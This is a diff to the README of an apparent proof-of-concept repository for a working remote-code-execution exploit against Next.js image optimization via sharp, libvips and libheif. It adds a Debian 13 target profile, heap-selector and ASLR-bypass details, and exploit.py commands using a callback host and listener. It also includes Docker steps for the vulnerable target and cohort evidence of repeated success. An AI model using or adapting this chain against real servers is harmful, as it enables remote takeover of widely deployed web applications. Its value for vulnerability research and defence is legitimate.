@@ -16,9 +16,8 @@ The exploit uses only the target's HTTP upload and image-optimization routes:
 2. It proceeds only when one profile and one randomized libvips base are
    supported by all required independent anchors.
 3. It resolves the two-byte fake-node selector using the selected profile. The
-   stock profile requires a complete marked heap record. The PIE profile uses
-   a verified allocator page-lane invariant and also records a marker-free
-   tail record when the response exposes one.
+   stock profile requires a complete marked heap record. Each PIE profile uses
+   its independently measured allocator page-lane relationship.
 4. It calculates a control target as the recovered libvips base plus the
    profile-verified internal `g_module_open_full` offset.
 5. On the attacker machine, it compiles a small shared object whose constructor
@@ -42,34 +41,37 @@ The libvips-relative validation cohort is recorded in
 All ten fresh processes returned valid `/usr/bin/id` output with ten distinct
 randomized libvips bases and ten independently derived loader addresses.
 
-The PIE acceptance cohort is recorded in
+The Ubuntu PIE acceptance cohort is recorded in
 [`evidence/libvips-gmodule-pie-rce-10x.json`](evidence/libvips-gmodule-pie-rce-10x.json).
-All ten fresh `ET_DYN` Node processes returned valid `/usr/bin/id` output. The
-cohort observed ten distinct randomized libvips bases. Six responses also
-contained the validating PIE tail record; the other four used the same
-profile-pinned page-lane invariant without pretending that a record was
-present.
+The Debian 13 APT cohort is recorded in
+[`evidence/debian13-apt-libvips-gmodule-rce-10x.json`](evidence/debian13-apt-libvips-gmodule-rce-10x.json).
+Each cohort returned valid `/usr/bin/id` output in all ten fresh `ET_DYN` Node
+processes, chose the correct profile ten times, and observed ten distinct
+randomized libvips bases.
 
-## Tested stack
+## Tested stacks
 
-- Node.js 25.8.1, PIE `ET_DYN`
-  - build ID `c52fa8d905d7eab79d16c17215f1618f1b8a4429`
-  - SHA-256 `4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c`
-- Next.js 15.5.23
-- sharp 0.34.4
-- bundled libvips 8.17.2
-- bundled libheif 1.20.2
-- Linux x86-64 with ASLR and NX enabled
+Both x86-64 targets use Next.js 15.5.23, sharp 0.34.4, bundled libvips
+8.17.2, bundled libheif 1.20.2, ASLR, and NX. Their native runtimes differ:
 
-The PIE cohort uses the exact Node artifact above with ASLR and NX enabled. The
-chain does not need the randomized Node base: its control target is the hidden
-GModule loader inside libvips, whose randomized base is recovered from returned
-pixels. The profile pins that loader's libvips-relative offset and bytes, the
-`memcpy` relocation, and the allocator relationships. It contains no absolute
-code address and no literal fake-node selector. For the PIE build, the selector
-is calculated as the profile's `0x6000` page lane plus the signed `-0x690`
-fake-node relation, modulo 16 bits. The marker-free tail record independently
-corroborated this calculation in six of ten fresh processes.
+| Profile | Node | glibc | libstdc++ | Selector relation |
+| --- | --- | --- | --- | --- |
+| Ubuntu | 25.8.1, PIE `ET_DYN` | 2.43-2ubuntu2.4 | 6.0.35 | `0x6000 - 0x690 = 0x5970` |
+| Debian 13 | Debian APT 20.19.2, PIE `ET_DYN` | 2.41-12+deb13u4 | 6.0.33 | `0x6000 - 0x3a0 = 0x5c60` |
+
+The complete build IDs and SHA-256 values are in
+[`profiles/native_stack_profiles_pie.json`](profiles/native_stack_profiles_pie.json).
+The Debian package, artifact, route-smoke, and five-lifetime layout measurements
+are captured in
+[`evidence/debian13-profile-derivation.json`](evidence/debian13-profile-derivation.json).
+The Debian target uses the standard distribution package
+`nodejs=20.19.2+dfsg-1+deb13u3`; Node is not compiled from source.
+
+The chain does not need the randomized Node base. Its control target is the
+hidden GModule loader inside libvips, whose randomized base is recovered from
+returned pixels. Each profile pins the loader's libvips-relative offset and
+bytes, the `memcpy` relocation, and its measured allocator relationship. The
+profiles contain no absolute runtime address and no literal final selector.
 
 The exploit fails closed when a profile is malformed or returned pixels do not
 select exactly one supported profile/base pair. The stock profile additionally
@@ -90,7 +92,7 @@ point and instruction signature before it was used in the remote cohort.
 - `ffmpeg` with the `libaom-av1` encoder
 - a C compiler available as `cc` on the attacker machine
 - an IPv4 callback address reachable from the target
-- Node.js 25.8.1 and npm to run the included lab
+- Node.js and npm to run the lab directly, or Docker for the Debian target
 
 Install the only Python dependency:
 
@@ -120,6 +122,18 @@ npm run start
 
 The target is then available at `http://127.0.0.1:3000`.
 
+To reproduce the second target with Debian's supported APT package:
+
+```bash
+./scripts/build_debian13_container.sh
+docker run --rm --network host \
+  fortbridge/libheif-grid-nextjs-rce:debian13
+```
+
+The image is built from a digest-pinned Debian 13 slim base. npm is present
+only in the builder stage; the final target installs Node from Debian APT and
+runs the same application and routes.
+
 Do not add `LD_PRELOAD`, `MALLOC_ARENA_MAX`, `GLIBC_TUNABLES`,
 `VIPS_CONCURRENCY` or `UV_THREADPOOL_SIZE`. The published result uses the
 stock process environment and normal sharp worker scheduling.
@@ -135,8 +149,9 @@ python3 exploit.py \
   --json-output result.json
 ```
 
-The default manifest describes the stock `ET_EXEC` lab. For the verified PIE
-artifact, select its separate strict manifest:
+The default manifest describes the stock `ET_EXEC` lab. The strict PIE
+manifest contains both Ubuntu and Debian profiles. The exploit selects between
+them from the returned pixels; `--profile` is not needed:
 
 ```bash
 python3 exploit.py \
@@ -178,23 +193,21 @@ A successful result contains:
   },
   "heap_calibration": {
     "derived_selector": "0x5970",
-    "selector_source": "profile_page_lane_and_returned_record",
+    "selector_source": "profile_page_lane",
     "profile_candidate_selector": "0x5970",
-    "record_candidate_selectors": ["0x5970"],
+    "profile_selector_evidence": {
+      "anchor_page_low16": "0x6000",
+      "fake_node_delta_from_anchor_page": "-0x690",
+      "derivation": "(0x6000 + -0x690) & 0xffff = 0x5970"
+    },
+    "record_candidate_selectors": [],
     "minimum_observations": 1,
     "observations": [
       {
         "response_sha256": "...",
+        "selector_source": "profile_page_lane",
         "candidate_selectors": ["0x5970"],
-        "matches": [
-          {
-            "response_offset": "0xec658",
-            "anchor": "0x7f00104f6c30",
-            "anchor_page": "0x7f00104f6000",
-            "fake_node_delta_from_anchor_page": "-0x690",
-            "derived_fake_node": "0x7f00104f5970"
-          }
-        ]
+        "matches": []
       }
     ]
   },
@@ -214,7 +227,8 @@ A successful result contains:
     "selected_anchors": [
       {"offset": "0x1be1b0", "value": "0x7f12345be1b0", "repetitions": 1},
       {"offset": "0x1c3120", "value": "0x7f12345c3120", "repetitions": 3},
-      {"offset": "0x1c3130", "value": "0x7f12345c3130", "repetitions": 3}
+      {"offset": "0x1c3130", "value": "0x7f12345c3130", "repetitions": 3},
+      {"offset": "0x33cd0c", "value": "0x7f123473cd0c", "repetitions": 1}
     ],
     "rejected_candidates": []
   },
@@ -243,7 +257,7 @@ for context but are not success conditions.
 --callback-host IPV4      Address embedded in the uploaded library (required)
 --callback-port PORT      Callback and listener port (default: 31337)
 --listen-host IPV4        Local bind address (default: 0.0.0.0)
---leak-attempts N         Maximum donor requests (default: 64)
+--leak-attempts N         Maximum donor requests (default: 128)
 --callback-timeout SEC    Listener timeout (default: 12)
 --trigger-timeout SEC     Optimizer request timeout (default: 20)
 --profile-manifest FILE   Profile manifest (default: repository manifest)
@@ -271,7 +285,8 @@ application paths.
 
 The runtime loader rejects unknown or missing fields, malformed numbers and
 digests, unsafe paths, and inconsistent geometry before making an HTTP request.
-A profile is a verified compatibility record, not an automatic OS guess.
+A profile is a verified compatibility record, not a guess based on an HTTP
+banner or OS name.
 
 Each libvips classifier entry declares independent module-relative anchors,
 the minimum number of times each anchor must appear, how many distinct anchors
@@ -279,6 +294,11 @@ are required, the alpha-channel byte window to scan, the qword stride, and the
 expected page alignment. For every returned image, the classifier subtracts
 each candidate profile's anchor offsets from the returned qwords. It accepts a
 result only when exactly one profile/base pair reaches the declared consensus.
+The two PIE profiles deliberately share the same bundled libvips binary and
+therefore the same three core anchors. Extra profile-specific qwords at stable
+deltas from that base distinguish the surrounding Ubuntu and Debian native
+layouts. Missing or cross-matched evidence produces `no_match` or `ambiguous`,
+never a guessed profile.
 
 Server, framework, image-geometry, OS, and glibc hints are supporting metadata
 only. They are recorded in the result but never identify a binary and never
@@ -297,18 +317,20 @@ profile and base, each anchor value and repetition count, and every rejected
 candidate. It also records each heap response hash, matching response offset,
 arena sentinel, heap pointers, libvips references, signed relation and derived
 selector. Earlier no-match attempts remain in the `classification.attempts`
-array for auditability.
+array for auditability. The cohort harness compacts those earlier attempts to
+their decision outcomes so committed evidence does not duplicate large pointer
+inventories from every retry.
 
 The heap selector has two explicit strategies. The stock profile uses
 `response_record`: a candidate must be inside a complete marked record with
 the expected chunk size, arena sentinel, paired heap pointers and three
-libvips-relative references. The PIE profile uses `profile_page_lane`: the
-two-byte selector is calculated from a version-pinned allocator page lane and
-the signed page-to-fake-node relation. A returned marker-free tail record can
-corroborate that value, but is not reliably present in every process. The
-10-process PIE cohort observed it in six lifetimes and still reached RCE in
-all ten. The JSON evidence distinguishes `profile_page_lane` from
-`profile_page_lane_and_returned_record` so the source is never overstated.
+libvips-relative references. The PIE profiles use `profile_page_lane`: the
+two-byte selector is calculated from a measured allocator page lane and a
+profile-specific signed page-to-fake-node relation. Five fresh diagnostic
+Debian lifetimes measured the same `-0x3a0` relation before it was accepted;
+the Ubuntu profile retains its independently established `-0x690` relation.
+Late tail records are retained only as diagnostics because they did not
+reliably predict the allocation used by the following request.
 
 Verify a local stack against every declared identity before using its profile:
 
@@ -337,8 +359,15 @@ python3 -m unittest discover -s tests -v
 python3 scripts/fresh_process_cohort.py \
   --node /path/to/the/verified/pie/node \
   --manifest profiles/native_stack_profiles_pie.json \
+  --leak-attempts 128 \
   --lifetimes 10 \
   --output evidence/libvips-gmodule-pie-rce-10x.json
+
+python3 scripts/fresh_process_cohort.py \
+  --docker-image fortbridge/libheif-grid-nextjs-rce:debian13 \
+  --manifest profiles/native_stack_profiles_pie.json \
+  --lifetimes 10 \
+  --output evidence/debian13-apt-libvips-gmodule-rce-10x.json
 ```
 
 ## Repository layout
@@ -353,6 +382,8 @@ stack_profile.py                   strict native-stack profile loader
 profiles/native_stack_profiles.json exact supported artifact and ABI identity
 profiles/native_stack_profiles_pie.json exact PIE artifact and allocator profile
 tools/verify_profile_artifacts.py  offline exact-artifact verifier
+containers/debian13/               APT target and diagnostic-only GDB image
+scripts/build_debian13_container.sh reproducible Debian target build
 scripts/fresh_process_cohort.py    fresh-process validation harness
 tests/                             strict-loader and exploit regressions
 tests/fixtures/                    exact cross-build returned-pixel evidence
